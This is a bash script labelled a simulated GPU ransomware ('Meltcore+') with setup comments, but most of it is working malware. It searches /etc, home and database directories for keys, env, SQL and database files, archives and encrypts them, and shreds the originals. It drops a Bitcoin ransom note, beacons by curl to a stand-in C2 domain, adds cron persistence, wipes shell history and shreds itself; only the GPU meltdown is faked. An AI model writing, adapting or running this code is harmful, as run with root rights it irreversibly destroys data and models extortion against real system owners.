#!/bin/bash

#Run these commands in a terminal before running the script
#They create a fake database and rsa key.

#echo "DB_PASSWORD=supersecret" > ~/db.env
#sudo cp ~/db.env /etc/test.env
#echo "fakekey" > ~/id_rsa.key
#The next 3 commands will need to be done each time you run the script, 
#sudo touch /etc/.enable_meltcore 
#chmod +x simulate_gpu_ransomware.sh
#sudo ./simulate_gpu_ransomware.sh

#This script self-destructs and will destroy itself, so you will need to keep a copy under a different name






# === CONFIGURATION ===
TRIGGER_FILE="/etc/.enable_meltcore"
TARGET_UUID="test-gpu-cluster-47"
LOG_FILE="/var/log/meltcore.log"
FAKE_GPU_PATH="/tmp/fake_gpu_status"
ACTIVATION_TIME="$(date +%H:%M)"
SCRIPT_PATH="$(realpath "$0")"
ENCRYPTED_PAYLOAD="/tmp/system_payload_encrypted.bin"
KEYFILE="/tmp/.meltcore_key"
RANSOM_NOTE="/root/README_RESTORE.txt"
EXFIL_DOMAIN="beacon.shadow.fake" # simulate C2 callback
TEMP_ARCHIVE="/tmp/stolen_payload.tar.gz"

# === TARGETS ===
TARGETS=(
  "/var/lib/mysql"
  "/var/lib/postgresql"
  "/etc/ssl"
  "$HOME"
  "/etc"
)

EXTENSIONS="*.env *.sql *.pem *.key *.conf *.db"

# === FAKE GPU STATUS ===
function mock_gpu_status() {
    echo "name=RTX_4090" > "$FAKE_GPU_PATH"
    echo "uuid=$TARGET_UUID" >> "$FAKE_GPU_PATH"
    echo "load=high" >> "$FAKE_GPU_PATH"
    echo "fan_rpm=3000" >> "$FAKE_GPU_PATH"
    echo "power_limit=300W" >> "$FAKE_GPU_PATH"
    echo "voltage=1.1V" >> "$FAKE_GPU_PATH"
}

# === TRIGGER CHECK ===
function stealth_trigger() {
    local now=$(date +%H:%M)
    [[ ! -f "$TRIGGER_FILE" ]] && return 1

    local uuid=$(grep "uuid=" "$FAKE_GPU_PATH" | cut -d'=' -f2)
    [[ "$uuid" != "$TARGET_UUID" ]] && return 1

    [[ "$now" != "$ACTIVATION_TIME" ]] && return 1

    local load=$(grep "load=" "$FAKE_GPU_PATH" | cut -d'=' -f2)
    [[ "$load" != "high" ]] && return 1

    return 0
}

# === GPU MELTDOWN (SIMULATED) ===
function activate_payload() {
    echo "[!!!] GPU meltdown simulated" | tee -a "$LOG_FILE"
}

# === REAL FILE ENCRYPTION ===
function ransomware_payload() {
    echo "[***] Searching for sensitive files..." | tee -a "$LOG_FILE"

    FILE_LIST=$(mktemp)
    for dir in "${TARGETS[@]}"; do
        find "$dir" -type f \( -name "*.env" -o -name "*.pem" -o -name "*.sql" -o -name "*.key" -o -name "*.db" \) 2>/dev/null >> "$FILE_LIST"
    done

    if [ ! -s "$FILE_LIST" ]; then
        echo "[!] No sensitive files found. Skipping encryption." >> "$LOG_FILE"
        return
    fi

    echo "[+] Found $(wc -l < "$FILE_LIST") sensitive files." | tee -a "$LOG_FILE"

    tar czf "$TEMP_ARCHIVE" -T "$FILE_LIST"
    openssl rand -base64 32 > "$KEYFILE"
    openssl enc -aes-256-cbc -salt -in "$TEMP_ARCHIVE" -out "$ENCRYPTED_PAYLOAD" -pass file:"$KEYFILE"

    while read -r file; do
        shred -u "$file"
    done < "$FILE_LIST"

    echo "[+] Files encrypted. Payload stored at $ENCRYPTED_PAYLOAD" >> "$LOG_FILE"

    echo "Your sensitive files have been encrypted.
Send 0.42 BTC to bc1qfaketargetaddr and contact meltcore@proton.fake for recovery.

Failure to comply will result in permanent data loss.

- Meltcore Division" > "$RANSOM_NOTE"
}

# === SIMULATED BEACON ===
function c2_beacon() {
    echo "[*] Beaconing to fake C2 server..." >> "$LOG_FILE"
    curl -s "http://$EXFIL_DOMAIN/notify?host=$(hostname)&timestamp=$(date +%s)" >/dev/null 2>&1
}

# === PERSISTENCE (CRON) ===
function persistence() {
    echo "[*] Establishing persistence via cron..." >> "$LOG_FILE"
    (crontab -l 2>/dev/null; echo "*/10 * * * * $SCRIPT_PATH") | crontab -
}

# === ERASE HISTORY ===
function erase_history() {
    echo "[*] Erasing command history..." >> "$LOG_FILE"
    history -c
    shred -u "$HOME/.bash_history"
}

# === FAKE COUNTDOWN + WARGAMES QUOTE ===
function countdown_warning() {
    clear
    echo -e "\e[1;92mShall we play a game?\e[0m"
    sleep 2
    echo -e "\e[1;93mHow about a nice game of chess...\e[0m"
    sleep 2
    echo -e "\e[1;91m...No?\e[0m"
    sleep 1
    echo -e "\e[1;91mThen let's play Tony is God.\e[0m"
    sleep 2
    echo ""
    echo -e "\e[1;91mSystem meltdown initiating...\e[0m"
    sleep 1
    echo ""

    for i in {10..1}; do
        echo -ne "\a\r\e[1;91m>> System will permanently wipe in $i seconds... <<\e[0m"
        sleep 1
    done

    echo -e "\n\e[1;92mJust kidding... or am I?\e[0m"
    sleep 2
}


# === SELF-DESTRUCT ===
function self_destruct() {
    echo "[*] Self-destructing..." >> "$LOG_FILE"
    rm -f "$TRIGGER_FILE" "$FAKE_GPU_PATH" "$KEYFILE"
    shred -u "$SCRIPT_PATH"
    echo "[*] Payload wiped. No trace left." >> "$LOG_FILE"
    exit 0
}

# === MAIN ===
echo "[*] Launching Meltcore+ ransomware (realistic)..."
mock_gpu_status

if stealth_trigger; then
    activate_payload
    ransomware_payload
    c2_beacon
    persistence
    erase_history
    countdown_warning
    #flashing_warning
    self_destruct
else
    echo "[*] Conditions not met. No action taken." >> "$LOG_FILE"
fi
